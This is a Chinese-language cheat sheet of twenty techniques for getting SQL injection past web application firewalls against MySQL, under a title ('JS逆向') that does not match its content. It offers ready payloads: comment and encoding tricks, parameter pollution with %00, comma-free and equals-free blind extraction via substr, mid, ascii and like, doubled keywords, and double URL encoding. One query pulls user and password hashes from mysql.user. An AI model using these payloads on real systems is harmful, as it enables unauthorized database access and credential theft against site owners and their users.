# JS逆向

#### 1、空格字符绕过

两个空格代替一个空格，用Tab代替空格，%a0=空格。

使用URL编码的方式必须要在有中间件的网站上使用，直接使用sql语句进行查询是没办法解析的。

可以将空格字符替换成注释/**/，也可以使用内联注释，/!code/（关于内联注释请观看mysql文章）。

#### 2、大小写绕过

将字符串设置为大小写，例如and1=1转成AND1=1或者AnD 1=1；

mysql默认是不区分大小写的。

#### 3、浮点数绕过注入

可以在查询语句where条件这里使用，select * from users where id=1e0或者id=1.1。

#### 4、NULL值绕过

在查询语句where条件这里使用，select * from users where id=\N。

#### 5、引号绕过

如果waf拦截过滤单引号的时候，可以使用双引号在mysql里也可以用双引号作为字符。

比如select * from users where id=‘1’。

select * from users where id=“1”。

也可以将字符串转成16进制再进行查询。select hex（‘admin’） 已经select 0X61646D696E。

如果gpc开启了，但是注入点是整型，也可以用hex十六进制进行绕过。

#### 6、添加库名绕过

有些waf的拦截规则并不会拦截包含库名.表名这种模式。

比如 select * from users where id = -1 union select 1,2,3 from security.users;

mysql中也可以添加库名查询表，例如跨库查询mysql库里的users表的内容。

select * from users where id =-1 union select 1,2,concat(user,authentication_string) from mysql.user

#### 7、去重复绕过

在mysql查询可以使用distinct关键词去除查询的重复值，可以利用这点突破waf拦截。

select * from users where id=-1 union distinct select 1,2,version() from users

#### 8、反引号绕过

在mysql可以使用这里是反引号绕过一些waf拦截，字段可以加反引号或者不加，意义相同。

反引号前面不加空格也是可以的。

#### 9、脚本语言特性绕过

在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截；

id=1%00&id=2 union select 1,2,3 有些 waf 会去匹配第一个 id 参数 1%00 ，%00 是截断字符，waf 会自动截断，从而，不会检测后面的内容，到了程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截；

name=%00name=’ union select 1,(select version() from users limit 1)–+

其他语言特性：

#### 10、逗号绕过

目前有些防注入脚本都会对逗号进行拦截，例如常规注入中必须包含逗号；

select * from users where id=1 union select 1,2,3;

不用逗号是指定不行的。

#### 11、substr截取字符串

select(substr(database() from 1 for 1));

查询当前库第一个字符；

查询 s 等于 select(substr(database() from 1 for 1));页面返回正常；

同样我们也可以一个一个字符往后查

#### 12、mid截取字符串

mid() 函数跟 substr() 函数功能相同,如果 substr() 函数被拦截或者过滤可以使用这个函数代替 ；

select mid(database() from 1 for 1); # 方法如上；

select * from users where id=1 and ‘s’=(select(mid(database() from 1 for 1)));

select * from users where id=1 and 0x73=(select(mid(database() from 1 for 1)));

name=vince’ and (select(mid(database() from 1 for 1)))=‘p’–+

name=1’ or (select(mid(database() from 1 for 1)))=‘p’–+

#### 13、使用join绕过

使用 join 自连接两个表 ;

union select 1,2 #等价于 union select * from (select 1)a join (select 2)b

#a 和 b 分别是表的别名；

select * from users where id=-1 union select 1,2,3; # 可以变成下面的语句；

select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c;

select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c;

#### 14、like绕过

使用 like 模糊查询 select user() like ‘%r%’; 模糊查询成功返回 1 否则返回 0 ；

找到第一个字符后继续进行下一个字符匹配，从而找到所有的字符串，最后就是要查询的内容，这种 SQL 注入语句也不会存在逗号，从而绕过 waf 拦截；

select * from users where id=1 and (select user() like ‘%r%’);

select * from users where id=-1 union select 1,2,user() like ‘%root%’ limit 1;

#### 15、limit offset绕过

SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1 返回一条记录，如果对逗号进行拦截时，可以使用 limit 1 默认返回第一条数据；也可以使用 limit 1 offset 0 从零开始返回第一条记录，这样就绕过 waf 拦截了。

#### 16、or和xor not绕过。

目前主流的 waf 都会对：

•id=1 and 1=2、

id=1 or 1=2、

id=0 or 1=2

id=0 xor 1=1 limit 1 、

id=1 xor 1= 2

对这些常见的 SQL 注入检测语句进行拦截，像 and 这些还有字符代替；

字符如下：

• and 等于&&

• or 等于 ||

• not 等于 !

• xor 等于

所以可以转换成这样：

• id=1 and 1=1 等于 id=1 && 1=1

• id=1 and 1=2 等于 id=1 && 1=2

• id=1 or 1=1 等于 id=1 || 1=1

• id=0 or 1=0 等于 id=0 || 1=0

in运算符用来判断表达式的值是否位于给出的列表中；如果是，返回值为 1，否则返回值为 0；

• NOT IN 用来判断表达式的值是否不存在于给出的列表中；如果不是，返回值为 1，否则返回值为 0；

注意：在url使用逻辑运算符的时候要url编码；

#### 17、ascii字符对比绕过

许多 waf 会对 union select 进行拦截，而且通常比较变态，那么可以不使用联合查询注入，可以使用字符截取对比法，进行突破；

select substring(user(),1,1);

返回第一位

select * from users where id=1 and substring(user(),1,1)=‘r’;

字符匹配第一位

select * from users where id=1 and ascii(substring(user(),1,1))=114;

ascii码匹配

最好把’r’换成成 ascii 码，如果开启 gpc int 整形注入就不能用了 ；

我们可以看到不使用联合查询(union select)也可以把数据查询出来 ；

#### 18、等号绕过

如果程序会对=进行拦截 ，可以使用 like rlike regexp 或者使用 < 或者 >

select * from users where id=1 and ascii(substring(user(),1,1))<115;

select * from users where id=1 and ascii(substring(user(),1,1))>115;

#### 19、双关键词绕过

有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患；

双关键字绕过（若删除掉第一个匹配的 union 就能绕过）：

id=-1’UNIunionONSeLselectECT 1,2,3–+

到数据库里执行会变成：

id=-1’UNION SeLECT 1,2,3–+

从而绕过注入拦截；

这种方式也是需要程序配合的，如果有安全防护，可以试试；

#### 20、二次编码绕过

有些程序会解析二次编码，造成 SQL 注入，因为 url 两次编码过后，waf 是不会拦截的；

-1 union select 1,2,3,4#

第一次转码：

%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23

第二次转码：

%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33

• 注意：中间件只会进行一次解码，不会解析两次url编码的，两次编码 waf 是不会拦截的；

• 一般二次编码都是中间件进行了一次解码，然后程序内又进行了一次，才会解析，程序内一般用的都是函数urldecode函数；

• 所以，不管是开了gpc或者waf都是可以绕过的，而且不会拦截；
